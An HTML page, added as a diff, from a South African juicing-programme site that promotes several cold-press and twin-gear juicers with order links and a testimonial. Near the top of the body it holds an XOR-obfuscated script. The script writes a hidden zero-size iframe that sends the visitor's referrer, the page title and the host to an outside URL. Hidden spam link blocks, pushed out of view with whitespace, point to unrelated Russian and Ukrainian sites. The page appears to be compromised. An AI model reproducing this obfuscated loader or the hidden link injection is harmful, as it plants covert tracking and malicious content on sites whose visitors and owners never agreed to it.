@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <base href="http://www.juiceon.co.za/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="juicers" />
+  <meta name="rights" content="http://www.juiceon.co.za/" />
+  <meta name="title" content="Juicers - Juicers - JuiceOn" />
+  <meta name="description" content="Juicers - Juicer" />
+  
+  <title>Juicers - Juicers - JuiceOn</title>
+  <link href="/templates/vt_weightloss/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_k2/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/vt_weightloss/vtemtools/menus/css/style.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.juiceon.co.za/modules/mod_fje_likebox/css/style.css" type="text/css" />
+  <style type="text/css">
+.floatleft{float:left;}.floatright{float:right;}.none{display:none !important; visibility:hidden !important;}.navleft,.navleft1{width:20% !important;}.navright,.navright1{width:20% !important;}.contentwidthr{width:80% !important;}.contentwidthl{width:80% !important;}.contentwidth{width:60% !important;}.vt_section{width:1000px !important}body#vtem{font-family:Arial, Helvetica, sans-serif !important; font-size:12px !important;}h3,#vtem_menu{font-family:'Dosis', sans-serif;}.headermanual1{width:25% !important;}.headermanual2{width:75% !important;}.headermanual3{width:0% !important;}.headermanual4{width:0% !important;}.headermanual5{width:0% !important;}.headermanual6{width:0% !important;}.vt_width50{width:50% !important;}.vt_width25{width:25% !important;}.vt_width100{width:100% !important;}
+  </style>
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-noconflict.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-migrate.min.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/media/system/js/modal.js" type="text/javascript"></script>
+  <script src="/media/k2/assets/js/k2.noconflict.js" type="text/javascript"></script>
+  <script src="/components/com_k2/js/k2.js" type="text/javascript"></script>
+  <script src="/administrator/components/com_remoteimage/includes/js/remoteimage-admin.js" type="text/javascript"></script>
+  <script src="/media/system/js/caption.js" type="text/javascript"></script>
+  <script src="/templates/vt_weightloss/vtemtools/menus/vtem_menu.js" type="text/javascript"></script>
+  <script type="text/javascript">
+
+		jQuery(function($) {
+			SqueezeBox.initialize({});
+			SqueezeBox.assign($('a.modal').get(), {
+				parse: 'rel'
+			});
+		});var K2SitePath = '/';jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+  </script>
+
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/template.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/styles/style1.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/responsive.css" type="text/css" /><script type="text/javascript">
+      WebFontConfig = {
+        google: { families: ["Dosis"] }
+      };
+      (function() {
+        var wf = document.createElement("script");
+        wf.src = ("https:" == document.location.protocol ? "https" : "http") +
+            "://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js";
+        wf.type = "text/javascript";
+        wf.async = "true";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(wf, s);
+      })();
+    </script><!--[if lt IE 9]>
+		<script src="/media/jui/js/html5.js"></script>
+<![endif]-->
+<!--Start of yoonique.net Zopim Live Chat Script-->
+<script type="text/javascript">window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set._.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute('charset','utf-8'); $.src='//v2.zopim.com/?1lpdi4RC6fBagtMnKsWzC1nX1ws43uBY';z.t=+new Date;$.type='text/javascript';e.parentNode.insertBefore($,e)})(document,'script');</script>
+<!--End of yoonique.net Zopim Live Chat Script--></head><!--<a class="twitter-timeline" href="https://twitter.com/JuicingOn" data-widget-id="411114448074465280">Tweets by @JuicingOn</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>-->
+
+<!-- Piwik -->
+<script type="text/javascript">
+  var _paq = _paq || [];
+  _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u=(("https:" == document.location.protocol) ? "https" : "http") + "://brandmedia.co.za/piwik/";
+    _paq.push(['setTrackerUrl', u+'piwik.php']);
+    _paq.push(['setSiteId', 3]);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0]; g.type='text/javascript';
+    g.defer=true; g.async=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<noscript><p><img src="http://brandmedia.co.za/piwik/piwik.php?idsite=3" style="border:0;" alt="" /></p></noscript>
+<!-- End Piwik Code -->
+
+
+
+<body id="vtem" class="ie ie9 win com_content article template-style1">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+
+
+ 
+  <div id="vt_body_wrapper">
+      <div id="vt_main_wrapper">
+    <div id="vt_wrapper" class="clearfix">
+      <!-- /////////////////// HEADER LAYOUT ///////////////////////////////-->
+      <div id="vt_header_section" class="vt_header_section clearfix">  
+                  
+                    <div class="vt_wrapper_header clearfix">
+                      <div class="vt_section clearfix">        
+                         <div id="vt_header" class="vt_header clearfix">
+                              <div class="headermanual1  floatleft"><div class="vt_module_inside"><a id="vt_logo" href="http://www.juiceon.co.za/"><img src="templates/vt_weightloss/css/styles/vt_logo_style1.png" alt="VTEM Logo" /></a>		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					
+
+
+
+
+<script type="text/javascript">jQuery.noConflict();</script>
+
+
+<div class="scroll"></div>
+        <div id="jslikeboxsidebarright" style="top: 90px;">
+			
+            <div class="jslikeboxsidebarinner"><div class="jslikeboxsidebarbuttonright">
+			
+			
+			<div id="likeboxbluearrowright" style="width: 326px; padding: 7px;">
+
+			
+			 <div id="likebox-frame-lightr" style="width: 288px; overflow: hidden;">
+		<!--[if IE]>
+			 <iframe style="width: 293px; height: 610px; margin: -1px -4px 0 -4px;" frameborder="0" border="0" src="http://www.facebook.com/plugins/likebox.php?locale=en_GB&href=https://www.facebook.com/JuiceOnOnline&width=300&colorscheme=light&connections=50&stream=true&header=false&height=820" scrolling="no" frameborder="0" allowTransparency="true"></iframe>
+<![endif]-->
+
+<!--[if !IE]>-->
+    <object type="text/html" style="width: 293px; height: 610px; margin: -1px -4px 0 -4px;" data="http://www.facebook.com/plugins/likebox.php?locale=en_GB&href=https://www.facebook.com/JuiceOnOnline&width=300&colorscheme=light&connections=50&stream=true&header=false&height=820" ></object>
+<!--<![endif]-->
+
+		</div>	
+		
+	</div></div></div>
+
+
+</div>
+
+        <script type="text/javascript">
+
+             jQuery(document).ready(function($) {
+
+
+                $('#jslikeboxsidebarleft > div').hover(
+                    function () {
+                        $('.jslikeboxsidebarbuttonleft',$(this)).stop().animate({'marginLeft':'-12px'},400);
+                    },
+                    function () {
+                        $('.jslikeboxsidebarbuttonleft',$(this)).stop().animate({'marginLeft':'-305px'},400);
+                    }
+                );
+       
+		
+                $('#jslikeboxsidebarright > div').hover(
+                    function () {
+                        $('.jslikeboxsidebarbuttonright',$(this)).stop().animate({'marginLeft':'-290px'},400);
+                    },
+                    function () {
+                        $('.jslikeboxsidebarbuttonright',$(this)).stop().animate({'marginLeft':'8px'},400);
+                    }
+                );
+            });
+			
+</script>  
+
+
+
+
+
+                </div>   
+		</div>
+	</div></div><div class="headermanual2 separator_header floatleft"><div class="vt_module_inside defaultmenu"><div id="vt_main_menu" class="vt_menufix clearfix"><div id="vtem_menu" class="mlmenu plus fade"><ul class="menu_vtem_nav">
+<li id="item-482"><a href="/" > <span> Home</span></a></li><li id="item-483"><a href="/about" > <span> About</span></a></li><li id="item-508"><a href="/content/weight-loss" > <span> Weight Loss</span></a></li><li id="item-524"><a href="/get-started" > <span> Get Started</span></a></li><li id="item-529"><a href="/juicy-stuff" > <span> Juicy Stuff </span></a></li><li id="item-549"><a href="/success-stories" > <span> Success Stories</span></a></li><li id="item-666" class="current active"><a href="/content/juicers" > <span> Juicers</span></a></li><li id="item-668"><a href="/content/contact" > <span> Contact</span></a></li></ul></div><a href="#vtem_menu_mobile" class="vtemdrildown vtemdrillround" id="vtflatmenu">Mobile menu</a><div id="vtem_menu_mobile" class="hidden vt_drilldown_menu" style="display:none;"><ul class="menu-mobi">
+<li id="item-482"><a href="/" > <span> Home</span></a></li><li id="item-483"><a href="/about" > <span> About</span></a></li><li id="item-508"><a href="/content/weight-loss" > <span> Weight Loss</span></a></li><li id="item-524"><a href="/get-started" > <span> Get Started</span></a></li><li id="item-529"><a href="/juicy-stuff" > <span> Juicy Stuff </span></a></li><li id="item-549"><a href="/success-stories" > <span> Success Stories</span></a></li><li id="item-666" class="current active"><a href="/content/juicers" > <span> Juicers</span></a></li><li id="item-668"><a href="/content/contact" > <span> Contact</span></a></li></ul></div></div></div></div>                         </div>
+                         </div>
+                     </div>  
+                                                  
+      </div> 
+       <!-- /////////////////// MAIN LAYOUT ///////////////////////////////-->
+       <div id="vt_main_section" class="vt_main_section clearfix">
+                 
+                              
+                  <div id="vt_main_contaner" class="clearfix">
+                       <div id="vt_main_inside" class="clearfix">
+                        <div class="vt_section clearfix">
+              <div id="vt_main_com" class="vt_auto_cols widthmain100 floatleft">
+                           <div class="vt_component_inside"><div class="vt_blog">
+<div class="vt_detail_page item-page">
+		
+
+	
+	
+		                                                                                                                                                                                                                                                 <div id="vtem-nt"><a href="http://joomla-master.org/" target="_blank" title="Joomla шаблоны">Joomla шаблоны</a><br><a href="http://мир-историй.рф/" target="_blank" title="аудио книги скачать">аудио книги скачать</a></div>
+						<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<table width="100%">
+<tbody>
+<tr>
+<td>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong><span style="font-size: 12pt; font-family: verdana, geneva; color: #99cc00;">DNA Cold Press Juicer</span><br /></strong></span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><img style="display: block; margin-left: auto; margin-right: auto;" src="http://www.juiceon.co.za/images/Articles/JuiceOn-DNA-Juicer.png" alt="JuiceOn-DNA-Juicer.png" /></span></p>
+<div style="text-align: center;" align="right"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><a class="vtem-typo-btn btn-rounded vtem-typo-btn-big btn-green" title="A new tab will open to our fortydays shop " href="http://www.fortydays.co.za/shop/health-appliances/dna-juicer/" target="_new">Order here</a></span></div>
+<h2><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong> </strong></span></h2>
+<p><span style="line-height: 1.3em; font-family: tahoma, arial, helvetica, sans-serif;">Reap all of the benefits of a Single Auger Masticating Juicer in less space than most juicers on the market!<br /><br /></span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><b>Cold Press Technology System</b></span><br /><span style="font-family: tahoma, arial, helvetica, sans-serif;">It is a complete departure from the standard masticating method. The Cold Press Technology method allows the DNA Juicer to extract the maximum amount of nutrients, vitamins, taste and juice from a minimum amount of fruits, vegetables, leafy greens, even soybeans!</span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<h3><span style="font-family: verdana, geneva; color: #99cc00; font-size: 12pt;"><strong>Why do we recommend the DNA Juicer?</strong></span></h3>
+<ul>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Dual Stage Juicing</b> - juice is extracted through the first crushing stage and before the pulp is ejected, it is then squeezed during the second pressing stage; resulting in more juice, and extremely dry pulp. </span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Higher yields</b> - in-house testing found the DNA Juicer yielded 50% more juice than a centrifuge juicer in 50% of the time</span></p>
+</li>
+<li><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Economical</b> - Get the greatest amount of juice from the least amount of fruits. Peels and skins can be also used in various pastries, jams, soups, etc.</span></li>
+</ul>
+<ul>
+<li><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Better Juice, Healthier Juice</b> - Enjoy more antioxidants, better flavor and superior freshness of your juice. No frothing or foaming, and none of the separation that occurs with other juicers.</span></li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Self Cleaning</b> - Simply pour water through to self clean the juicer when changing to another fruit, vegetable or leafy green. Save time!</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Small Footprint</b> - all of the performance of a masticating single auger juicer, but with less space requirements than most centrifuge-style juicers </span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Vegetable Juice</b> - The DNA juicer excels at making juice out of your favorite leafy greens and wheatgrass. </span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif; font-size: 10pt;"><b>Silence</b> - The DNA juicer minimizes the noise by squeezing slowly rather than grinding at high speed like centrifugal juicers. The 8x harder auger is manufactured out of GE Ultem material.</span><br /><span style="font-family: tahoma, arial, helvetica, sans-serif;">  </span></p>
+<div><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></div>
+</li>
+</ul>
+</td>
+</tr>
+</tbody>
+</table>
+<table width="100%">
+<tbody>
+<tr>
+<td>
+<h2 style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong><span style="color: #99cc00; font-family: verdana, geneva; font-size: 12pt;">Matstone 6 in 1</span><br /></strong></span></h2>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><img style="display: block; margin-left: auto; margin-right: auto;" src="http://www.juiceon.co.za/images/juicers/JuiceOn-Matstone-Juicer.jpg" alt="JuiceOn-Matstone-Juicer.jpg" /></span></p>
+<div style="text-align: center;" align="right"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><a class="vtem-typo-btn btn-rounded vtem-typo-btn-big btn-green" title="A new tab will open to our fortydays shop " href="http://www.fortydays.co.za/shop/juiceon/matstone-6-in-1-juicer/" target="_new"> Order here</a></span></div>
+<h2 style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong> </strong></span></h2>
+<p style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;">The Matstone 6 in 1 Juicer is a great juicer at a great price and with superb features, versatility and providing amazing health benefits. The Matstone 6 in 1 is a slow turning cold press style juicer and can extract healthy juices from carrots, celery, parsley, apple, spinach, wheatgrass, orange, kale, cucumber, ginger, sprouts, and many other leafy greens  It is a great all round juicer. It’s single auger masticating process efficiently extracts the enzyme and nutrient rich juice and the gentle, slow chewing, 80 rpm auger action reduces friction and heat and ensures that the juice is of a high quality.</span></p>
+<p style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<p><span style="font-family: verdana, geneva; color: #99cc00; font-size: 12pt;"><strong>Why do we recommend the Matstone Juicer?</strong></span></p>
+<ul>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Its a slow turning cold press style juicer - this retains maximum nutritional power in the juice or ‘living juices’ . The juicer operates at 160 watts</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Very efficient energy consumption as well as a peaceful, quiet juice making experience even though there is a strong 1 HP motor driving the auger.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Very easy to strip down for cleaning and storage. The machine can be stripped down in only 20 seconds.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Does an excellent job on all fruits and vegetables including wheatgrass and other leafy greens.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Quiet and carries a massive 12 year motor warranty.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">A multi purpose, masticating juicer and uses the single auger method of juicing to extract the juice.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Comes with everything you need to juice, grind, make nut butters, baby food, sauces and dips.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Low price.</span></p>
+<br /><br /></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>
+<h2><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong><span style="color: #99cc00; font-family: verdana, geneva; font-size: 12pt;">Green Star 5000</span><br /></strong></span></h2>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><img style="display: block; margin-left: auto; margin-right: auto;" src="http://www.juiceon.co.za/images/juicers/JuiceOn-GreenStar.jpg" alt="JuiceOn-GreenStar.jpg" /></span></p>
+<div style="text-align: center;" align="right"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><a class="vtem-typo-btn btn-rounded vtem-typo-btn-big btn-green" title="A new tab will open to our fortydays shop " href="http://www.fortydays.co.za/shop/juiceon/matstone-6-in-1-juicer/" target="_new"> Order here</a></span></div>
+<p style="text-align: justify;"><br /><span style="font-family: tahoma, arial, helvetica, sans-serif;">The world’s best juicer, the Green Star 5000 Juicer has a five-year warranty and is new and improved. With patented Twin Gear Technology, the Green Star gets maximum nutrition and maximum quantity of fresh, LIVE juice.</span></p>
+<p style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<h3><span style="font-family: verdana, geneva; color: #99cc00; font-size: 12pt;">Features:</span></h3>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Green Star machines are reputably one of the world’s best juice extractors and most efficient food processors. Using Exclusive Heavy Duty Twin Gear technology with a low 110 rpm, superior to those of any competitor, Green Star machines are your best choice. There is no need to look elsewhere. With their ease of use and simple clean up, Green Star Juice Extractors and Food Processors are award-winning machines of unsurpassed quality.</span></p>
+<p style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<p style="text-align: justify;"><span style="font-family: tahoma, arial, helvetica, sans-serif;">Because of the precision machined twin gear construction, the gears are extremely effective in pulverizing the juicing substrate. The juice is extracted at constant volume (no taper from big to small). It has a unique pressure relieve valve, fitted onto the front of the juicing chamber. All the twin gears of the twin gear technology group are parallel; this gives a constant volume process with minimal internal friction and heat build-up. The only friction occurs when the already dry pulp exits the juicing chamber.</span><br /><br /><br /></p>
+</td>
+</tr>
+<tr>
+<td>
+<h2><span style="font-family: tahoma, arial, helvetica, sans-serif;"><strong><span style="color: #99cc00; font-family: verdana, geneva; font-size: 12pt;">Angel Juicer </span><br /></strong></span></h2>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"><img style="display: block; margin-left: auto; margin-right: auto;" src="http://www.juiceon.co.za/images/juicers/JuiceOn-angel.jpg" alt="JuiceOn-angel.jpg" /></span></p>
+<div style="text-align: center;" align="right"><span style="font-family: tahoma, arial, helvetica, sans-serif;"><a class="vtem-typo-btn btn-rounded vtem-typo-btn-big btn-green" title="A new tab will open to our fortydays shop " href="http://www.fortydays.co.za/shop/juiceon/matstone-6-in-1-juicer/" target="_new"> Order here</a></span></div>
+<p><br /><span style="font-family: tahoma, arial, helvetica, sans-serif;">The Angel Juicer is the most advanced and effective juicer on the market</span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<h3><span style="font-family: tahoma, arial, helvetica, sans-serif; color: #99cc00;">The advantages of Angel juicers:</span></h3>
+<ul>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Much more juice, with far more nutrients</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">The nutrients next to the outer skin of the juicing substrates are superior in nutrients, and the Angel is perfectly equipped to extract juice, even the toughest of tough juicing substrate.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Superior rich taste and colour of the juice.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Quiet operation.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">It can make seed juices from soaked seeds.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Less juicing preparation, since it will also eat a big carrot without chopping.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Much better juice yield than the twin gear, single auger and centrifugal juicers.</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">It is more versatile than the single auger, hydraulic and centrifugal juicer.</span></p>
+</li>
+</ul>
+<h3><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></h3>
+<h3><span style="font-family: tahoma, arial, helvetica, sans-serif; color: #99cc00;">Superior Features:</span></h3>
+<ul>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">All stainless steel construction – durable, hygienic and stylish</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">86 rpm – low speed and heavy duty; no aeration and oxidisation</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Twin juicing gears that are bigger in diameter and length make it fast at juicing but low in rpm</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">3 HP grinding force – more than enough power</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">3-stage extracting twin gear system</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">3-stage screen system, all stainless steel</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Continuous juicing with automatic pulp ejection</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Super quiet operation</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Simple to operate and easy to clean, with a quick-release locking system</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Versatile and multi-functional: makes juices (fruit, grass, herbs, seeds and vegetables), nut butters, frozen fruit sorbets, raw</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">soups and soy bean tofu; can also grind sprouted grain into dough</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Minimum friction and heat build-up</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">No pulp adjustment necessary</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">This machine saves lots of time, energy, money and effort</span></p>
+</li>
+<li>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Large feeding chute - minimizes chopping</span></p>
+</li>
+</ul>
+</td>
+</tr>
+</tbody>
+</table>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;"> </span></p>
+<p><span style="font-family: tahoma, arial, helvetica, sans-serif;">Read more about<a href="http://www.juiceon.co.za/juicer-technology-explained"> Juicer Technology Explained</a></span></p>
+<!--<p>Read more about <a href="#">comparison juicers</a></p>--> 
+	
+						                                                                                                                                                                                                                                                          <div id="vtem-nt"><a href="http://allstyling.ru/" target="_blank" title="All Styling">All Styling</a><br><a href="http://absolut.vn.ua/" target="_blank" title="Absolut">Absolut</a></div> </div>
+</div><br> </div>
+                        </div>   
+                        </div>           
+            </div> 
+                       </div>   
+            
+                    
+      </div>
+      <!-- /////////////////// FOOTER LAYOUT ///////////////////////////-->   
+  <div id="vt_footer_section" class="vt_footer_section clearfix"> 
+        <div id="vt_wapper_footer"> 
+                            <div id="vt_footer" class="vt_footer clearfix">
+                 <div class="vt_section clearfix">
+                        <div class="vt_width25  floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Proven Results</span></span></h3>
+					
+
+<div class="custom"  >
+	<p><span style="font-family: verdana, geneva; font-size: 10pt; line-height: 1.3em; color: #549c2f;">Join our 40 Day JuiceOn program now for only <strong>R2600</strong> (Includes our Essential Fasting Pack valued at over R1600)</span></p>
+<p><span class="best" style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;">Purchase any <strong><a href="http://www.fortydays.co.za/product-category/health-appliances/" target="_blank"><span style="color: #549c2f;">Juicer from us</span></a></strong>, and Save<strong> R220</strong> on your <a href="http://www.fortydays.co.za/shop/juiceon/juiceon-program/" target="_blank"><strong><span style="color: #549c2f;">JuiceOn Program</span></strong></a>! Order NOW!</span></p></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Support</span></span></h3>
+					
+
+<div class="custom"  >
+	<p style="text-align: left;"><span style="color: #549c2f;"><strong><span style="font-family: verdana, geneva; font-size: 10pt;"><a href="http://www.juiceon.co.za/your-health-coach"><span style="color: #549c2f;">Your health coach</span></a> </span></strong></span><br /><span class="best" style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;"> Personal Health Coach consultations can be purchased separately, complete the contact form with "Consultations" in the message subject and we will reply with more information. </span></p></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<h3><span class="vt_heading1"><span class="vt_heading2">Testimonials</span></span></h3>
+					
+
+<div class="custom"  >
+	<div class="testcopy" style="text-align: left;"><span style="font-family: verdana, geneva; font-size: 10pt; color: #549c2f;">In July 2010, I did a 40 day fast . I will be redoing the fast annually for as long as I live. My body has been in balance since then, I have become a vegetarian have started exercising and generally enjoying a better quality of life. The strangest thing is that the fast was not nearly as difficult as I thought it would be. I would gladly share my experiences with anyone interested in doing the fast, and would recommend it to everyone</span></div>
+<div class="testcopy" style="text-align: left;"><br /><span class="testname" style="font-family: verdana, geneva; font-size: 6pt; color: #549c2f;">George Sinovich - 2010 The Codfather Village Of Restaurants</span></div></div>
+         </div>   
+		</div>
+	</div></div><div class="vt_width25 separator_footer floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable_menu">
+        <div class="vt_box">
+					<ul class="menu nav-pills">
+<li id="item-659"><a href="/" ><span>Home</span></a></li><li id="item-435"><a href="/disclaimer" > <span> Disclaimer</span></a></li><li id="item-551"><a href="/site-map" > <span> Site Map</span></a></li><li id="item-567"><a href="/links?id=0" > <span> Links</span></a></li><li id="item-610"><a href="/partners" > <span> Partners</span></a></li></ul>         </div>   
+		</div>
+	</div></div>                 </div>
+                </div> 
+                      
+           <div class="wapper_copyright_gotop clearfix">
+                           <div class="vt_section clearfix">
+                 <div id="vt_copyright" class="vt_copyright clearfix">
+                        <div class="vt_width100  floatleft"><div class="vt_module_inside">		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					<div class="footer1">Copyright &#169; 2018 JuiceOn. All Rights Reserved.</div>
+<BR><BR>
+         </div>   
+		</div>
+	</div></div>                 </div>
